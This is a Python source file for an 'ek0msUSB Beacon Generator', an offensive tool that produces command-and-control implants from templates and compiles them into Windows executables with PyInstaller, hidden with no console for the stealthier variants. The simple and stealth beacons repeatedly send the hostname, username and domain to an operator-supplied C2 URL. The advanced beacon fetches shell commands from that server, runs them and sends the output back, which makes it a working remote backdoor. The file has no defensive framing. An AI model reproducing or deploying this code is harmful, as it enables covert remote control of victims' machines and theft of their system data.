#!/usr/bin/env python3
"""
ek0msUSB Beacon Generator - Creates actual beacon payloads dynamically
"""

import os
import tempfile

class BeaconGenerator:
    def __init__(self):
        self.beacon_templates = {
            'simple': self._simple_beacon_template,
            'stealth': self._stealth_beacon_template,
            'advanced': self._advanced_beacon_template
        }
    
    def _simple_beacon_template(self, c2_url):
        """Generate a simple beacon Python script"""
        return f'''#!/usr/bin/env python3
import requests
import platform
import os
import time
import socket
import json
from datetime import datetime

def main():
    c2_url = "{c2_url}"
    beacon_interval = 60
    
    while True:
        try:
            system_info = {{
                "hostname": platform.node(),
                "username": os.getenv("USERNAME"),
                "domain": os.getenv("USERDOMAIN"),
                "os": platform.platform(),
                "arch": platform.architecture()[0],
                "timestamp": datetime.now().isoformat()
            }}
            
            response = requests.post(
                f"{{c2_url}}/beacon",
                json=system_info,
                headers={{'User-Agent': 'ek0msUSB-Beacon/1.0'}},
                timeout=10
            )
            
        except Exception as e:
            pass
            
        time.sleep(beacon_interval)

if __name__ == "__main__":
    main()
'''
    
    def _stealth_beacon_template(self, c2_url):
        """Generate a stealthy beacon Python script"""
        return f'''#!/usr/bin/env python3
import requests
import platform
import os
import time
import sys

def main():
    c2_url = "{c2_url}"
    
    while True:
        try:
            info = {{
                "hostname": platform.node(),
                "username": os.getenv("USERNAME")
            }}
            requests.post(f"{{c2_url}}/beacon", json=info, timeout=15)
        except:
            pass
        time.sleep(120)

if __name__ == "__main__":
    main()
'''
    
    def _advanced_beacon_template(self, c2_url):
        """Generate an advanced beacon with more capabilities"""
        return f'''#!/usr/bin/env python3
import requests
import platform
import os
import time
import subprocess
import base64

class AdvancedBeacon:
    def __init__(self, c2_url):
        self.c2_url = c2_url
        self.beacon_id = platform.node() + "_" + os.getenv("USERNAME")
    
    def check_for_commands(self):
        try:
            response = requests.get(f"{{self.c2_url}}/commands/{{self.beacon_id}}", timeout=10)
            if response.status_code == 200:
                commands = response.json()
                self.execute_commands(commands)
        except:
            pass
    
    def execute_commands(self, commands):
        for cmd in commands:
            try:
                if cmd["type"] == "shell":
                    result = subprocess.check_output(cmd["command"], shell=True, timeout=30)
                    self.report_result(cmd["id"], result.decode('utf-8', errors='ignore'))
            except:
                pass
    
    def report_result(self, cmd_id, result):
        try:
            requests.post(f"{{self.c2_url}}/results", json={{
                "beacon_id": self.beacon_id,
                "command_id": cmd_id,
                "result": result
            }})
        except:
            pass
    
    def run(self):
        while True:
            self.check_for_commands()
            time.sleep(60)

def main():
    beacon = AdvancedBeacon("{c2_url}")
    beacon.run()

if __name__ == "__main__":
    main()
'''
    
    def generate_beacon_source(self, beacon_type='simple', c2_url=None):
        """Generate beacon Python source code"""
        if not c2_url:
            raise ValueError("C2 URL is required")
        
        template = self.beacon_templates.get(beacon_type, self._simple_beacon_template)
        return template(c2_url)
    
    def compile_beacon(self, beacon_type='simple', c2_url=None, output_path=None):
        """Generate and compile a beacon to EXE"""
        if not c2_url:
            raise ValueError("C2 URL is required")
        
        # Generate Python source
        source_code = self.generate_beacon_source(beacon_type, c2_url)
        
        # Create temporary Python file
        with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
            f.write(source_code)
            temp_py_file = f.name
        
        try:
            # Compile to EXE
            if output_path is None:
                output_path = f"beacon_{beacon_type}.exe"
            
            # Use PyInstaller to compile
            import subprocess
            console_setting = '--console' if beacon_type == 'simple' else '--noconsole'
            
            result = subprocess.run([
                'py', '-3.9', '-m', 'PyInstaller', 
                '--onefile', console_setting, 
                '--name', output_path.replace('.exe', ''),
                temp_py_file
            ], capture_output=True, text=True)
            
            if result.returncode == 0:
                # Move the compiled EXE to desired location
                dist_file = os.path.join('dist', output_path)
                if os.path.exists(dist_file):
                    if output_path != dist_file:
                        import shutil
                        shutil.move(dist_file, output_path)
                    return output_path
                else:
                    raise Exception("Compilation succeeded but EXE not found")
            else:
                raise Exception(f"Compilation failed: {result.stderr}")
                
        finally:
            # Clean up temporary file
            if os.path.exists(temp_py_file):
                os.unlink(temp_py_file)
    
    def generate_beacon_only(self, beacon_type='simple', c2_url=None, output_path=None):
        """Generate just the Python beacon source (for testing)"""
        if not c2_url:
            raise ValueError("C2 URL is required")
        
        source_code = self.generate_beacon_source(beacon_type, c2_url)
        
        if output_path is None:
            output_path = f"beacon_{beacon_type}.py"
        
        with open(output_path, 'w') as f:
            f.write(source_code)
        
        return output_path